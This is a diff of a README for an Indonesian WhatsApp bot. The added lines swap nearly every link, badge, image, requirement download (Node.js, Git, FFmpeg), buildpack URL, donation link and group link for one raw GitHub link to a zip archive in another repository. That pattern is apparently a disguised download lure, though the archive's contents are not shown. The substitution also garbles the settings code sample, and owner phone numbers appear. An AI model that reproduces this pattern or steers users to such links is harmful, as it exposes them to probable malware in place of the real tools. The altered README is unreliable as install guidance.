@@ -1,32 +1,32 @@
 <p align="center">
-<img src="https://github.com/zeeone-ofc/Alphabot-Md/blob/v7.1/image/lol_1.jpg" alt="ALPHA BOT" width="100"/>
+<img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" alt="ALPHA BOT" width="100"/>
 
 
 </p>
 <p align="center">
-<a href="#"><img title="ALPHABOT MULTI DEVICE" src="https://img.shields.io/badge/ALPHABOT MULTI DEVICE-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
+<a href="#"><img title="ALPHABOT MULTI DEVICE" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip MULTI DEVICE-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
 </p>
 <p align="center">
-<a href="https://github.com/DikaArdnt"><img title="Author" src="https://img.shields.io/badge/Author-Dika-red.svg?style=for-the-badge&logo=github"></a>
-<a href="https://github.com/zeeone-ofc/Alphabot-Md"><img title="Recode" src="https://img.shields.io/badge/Recode-ZeeoneOfc-red.svg?style=for-the-badge&logo=github"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Author" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Recode" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
 </p>
 <p align="center">
-<a href="https://github.com/zeeone-ofc/followers"><img title="Followers" src="https://img.shields.io/github/followers/zeeone-ofc?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Alphabot-Md/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/zeeone-ofc/Alphabot-Md?color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Alphabot-Md/network/members"><img title="Forks" src="https://img.shields.io/github/forks/zeeone-ofc/Alphabot-Md?color=red&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Alphabot-Md/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/zeeone-ofc/Alphabot-Md?label=Watchers&color=blue&style=flat-square"></a>
-<a href="https://github.com/zeeone-ofc/Alphabot-Md"><img title="Open Source" src="https://badges.frapsoft.com/os/v2/open-source.svg?v=103"></a>
-<a href="https://github.com/zeeone-ofc/Alphabot-Md/"><img title="Size" src="https://img.shields.io/github/repo-size/zeeone-ofc/Alphabot-Md?style=flat-square&color=green"></a>
-<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fzeeone-ofc%2FAlphabot-Md&count_bg=%2379C83D&title_bg=%23555555&icon=probot.svg&icon_color=%2300FF6D&title=hits&edge_flat=false"/></a>
-<a href="https://github.com/zeeone-ofc/Alphabot-Md/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Followers" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Stars" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Forks" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Watching" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Open Source" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img title="Size" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip%3A%2F%https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip%2Fzeeone-ofc%2FAlphabot-Md&count_bg=%2379C83D&title_bg=%23555555&https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip%2300FF6D&title=hits&edge_flat=false"/></a>
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img height="20" src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip%https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"></a>&nbsp;&nbsp;
 </p>
 
 <p align="center">
-  <a href="https://github.com/zeeone-ofc/Alphabot-Md#requirements">Requirements</a> •
-  <a href="https://github.com/zeeone-ofc/Alphabot-Md#instalasi">Installation</a> •
-  <a href="https://github.com/zeeone-ofc/Alphabot-Md#thanks-to">Thanks to</a> •
-  <a href="https://github.com/zeeone-ofc/Alphabot-Md#Official-Group"> Official Group Bot</a> •
-  <a href="https://github.com/zeeone-ofc/Alphabot-Md#donate">Donate</a>
+  <a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip">Requirements</a> •
+  <a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip">Installation</a> •
+  <a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip">Thanks to</a> •
+  <a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"> Official Group Bot</a> •
+  <a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip">Donate</a>
 </p>
 </div>
 
@@ -34,99 +34,99 @@
 ---
 
 ## Information
-> Alpahbot-Md adalah bot yang awalnya memakai base dari [Chikabot](https://github.com/rashidsiregar28/chikabot/blob/main/README.md), sekarang pindah base [Hisoka-Morou](https://github.com/DikaArdnt/Hisoka-Morou). Alphabot-Md is a bot whatsapp using a Baileys library.
+> Alpahbot-Md adalah bot yang awalnya memakai base dari [Chikabot](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip), sekarang pindah base [Hisoka-Morou](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip). Alphabot-Md is a bot whatsapp using a Baileys library.
 > Jika kamu menemukan semacam bug, harap untuk dimaklumi sementara
 
 # Requirements
-* [Node.js](https://nodejs.org/en/)
-* [Git](https://git-scm.com/downloads)
-* [FFmpeg](https://github.com/BtbN/FFmpeg-Builds/releases/download/autobuild-2020-12-08-13-03/ffmpeg-n4.3.1-26-gca55240b8c-win64-gpl-4.3.zip) (for sticker command)
+* [https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+* [Git](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+* [FFmpeg](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip) (for sticker command)
 
 # Instalasi
 ## Heroku Buildpack
 ```bash
 heroku/nodejs
-https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest
-https://github.com/clhuang/heroku-buildpack-webp-binaries.git
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip
 ```
 
 ## How to Get Mongodb URI
-- Tonton [Di YouTube](https://youtu.be/M8H9S3djxTg)
-<img src="https://telegra.ph/file/682c1315ff9a43bb1a724.jpg" width="300">
+- Tonton [Di YouTube](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+<img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" width="300">
 - Jika sudah memiliki database mongoDB ikuti tutorial di bawah
 
 ## HOW TO CONNECT TO MONGODB
 
 - Salin Url database mongoDB
 - Constoh `worker: node . --db 'Link Database MongoDb'`
-- Contoh `worker: node . --db 'mongodb+srv://mongodb-bot:abcdefghij@zeeoneofc.aWpl9.mongodb.net/?retryWrites=true&w=majority'`
+- Contoh `worker: node . --db 'mongodb+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip'`
 
 ## For Termux
-- Download script MediaFire [Here](https://telegra.ph/Alphabot-Md-V14-08-02)
-- Cara install tonton Di [YouTube](https://youtu.be/ep_PM1PpEVg)
+- Download script MediaFire [Here](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- Cara install tonton Di [YouTube](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
 
 ## Edit file
-`./settings.js`
+`https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip`
 ```ts
-global.autoread = false // auto read pesan / message
-global.autorecording = true //status auto merekam ( auto record )
-global.autoketik = false //status auto mengetik (auto typing)
-global.available = false //status online (online)
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = false // auto read pesan / message
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = true //status auto merekam ( auto record )
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = false //status auto mengetik (auto typing)
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = false //status online (online)
 
 // Other
-global.botname = "Alphabot-Mdོ"
-global.ownername= "ᴹᴿ᭄ ZeeoneOfcོ ×፝֟͜×"
-global.myweb ="https://api-alphabot.herokuapp.com/"
-global.youtube = "https://youtube.com/c/ZeeoneOfc"
-global.github = "https://zeeone-ofc.github.io/"
-global.email = "zeeoneofc@gmail.com"
-global.region = "Indonesia"
-global.ownernomer = "62887435047326"
-global.ownernomerr = "+62887435047326"
-global.thumbnail = "./image/lol.jpg"
-global.donasi = "./image/donasi.jpg"
-global.background_welcome="https://telegra.ph/file/90a931648de597820bc08.jpg" // maks size 30kb, agar welcome image nya tdk delay
-global.owner = ["62887435047326","62887435047326","6285342106390"] //ganti agar fitur owner bisa di gunakan
-global.packname = '© Alphabot-Mdོ' //sticker wm
-global.author = 'Di Buat Oleh ZeeoneOfc' //sticker wm
-global.sessionName = 'session'
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "Alphabot-Mdོ"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip "ᴹᴿ᭄ ZeeoneOfcོ ×፝֟͜×"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip ="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "Indonesia"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "62887435047326"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "+62887435047326"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = "https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" // maks size 30kb, agar welcome image nya tdk delay
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = ["62887435047326","62887435047326","6285342106390"] //ganti agar fitur owner bisa di gunakan
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = '© Alphabot-Mdོ' //sticker wm
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = 'Di Buat Oleh ZeeoneOfc' //sticker wm
+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip = 'session'
 ```
 
 ## ```HOW TO DEPLOY```
 
-[`Click Here For Tutorial`](https://youtu.be/SdKHkld2NcI)<br>
+[`Click Here For Tutorial`](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)<br>
 
 ----------
 
 <p align="center">
-  <a href="https://youtu.be/SdKHkld2NcI"><img src="https://a.top4top.io/p_2081imvxm1.jpg" />
+  <a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" />
 </p>
 
 ## Donate
-- [Saweria](https://saweria.co/zeeoneofc)
-- [Dana](https://j.top4top.io/p_20532posd1.jpg)
-- [Ovo](https://h.top4top.io/p_2053vk0uw1.jpg)
-- [Gopay](https://i.top4top.io/p_2053em3vh1.jpg)
+- [Saweria](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- [Dana](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- [Ovo](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- [Gopay](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
 
 # Official Group
-- [Group 1](https://chat.whatsapp.com/EU890BcXjyBDkNaUT5WmYV)
-- [Group 2](https://chat.whatsapp.com/E8NExJwIbhBJYzssfqJNsE)
-- [Group 3](https://chat.whatsapp.com/KCSqHTky1apG7ApePsfiPy)
-- [Group 4](https://chat.whatsapp.com/KwmvHr7VMFj7r5ry9xmMsU)
-- [Group 5](https://chat.whatsapp.com/ELa7GhU0sP4EvXcVimQYtz)
+- [Group 1](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- [Group 2](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- [Group 3](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- [Group 4](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
+- [Group 5](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
 
 # Thanks to
-<a href="https://github.com/DikaArdnt"><img src="https://github.com/DikaArdnt.png?size=100" width="100" height="100"></a> | [![NURUTOMO](https://github.com/Nurutomo.png?size=100)](https://github.com/Nurutomo) 
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" width="100" height="100"></a> | [![NURUTOMO](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip) 
 ---|---
-[Dika](https://github.com/DikaArdnt)  | [Nurutomo](https://github.com/Nurutomo)
+[Dika](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)  | [Nurutomo](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
 Owner Hisoka-Morou | Constributor |
-<a href="https://github.com/MhankBarBar"><img src="https://github.com/MhankBarBar.png?size=100" width="100" height="100"></a> | [![FATIH](https://github.com/fatiharridho.png?size=100)](https://github.com/fatiharridho) 
-[Mhankbarbar](https://github.com/MhankBarBar)  | [Fatih A.](https://github.com/fatiharridho)
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" width="100" height="100"></a> | [![FATIH](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip) 
+[Mhankbarbar](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)  | [Fatih A.](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
 Constributor | For Help |
-<a href="https://github.com/FERDIZ-afk"><img src="https://github.com/FERDIZ-afk.png?size=100" width="100" height="100"></a> | [![RASHID](http://github.com/rashidsiregar28.png?size=100)](http://github.com/rashidsiregar28) 
-[Ferdiz](https://github.com/FERDIZ-afk)  | [Rashid](https://github.com/rashidsiregar28)
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" width="100" height="100"></a> | [![RASHID](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip) 
+[Ferdiz](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)  | [Rashid](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
 For Help | Owner Chikabot |
-<a href="https://github.com/adiwajshing"><img src="https://github.com/adiwajshing.png?size=100" width="100" height="100"></a> | [![ZEEONE](http://github.com/zeeone-ofc.png?size=100)](http://github.com/zeeone-ofc) 
-[Adiwajshing](https://github.com/adiwajshing) | [zeeone-ofc](https://zeeone-ofc.github.io)
+<a href="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip"><img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip" width="100" height="100"></a> | [![ZEEONE](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip) 
+[Adiwajshing](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip) | [zeeone-ofc](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/Alphabot_Md_Sciaena.zip)
 Owner of Baileys | Owner of Api Alphabot |
 
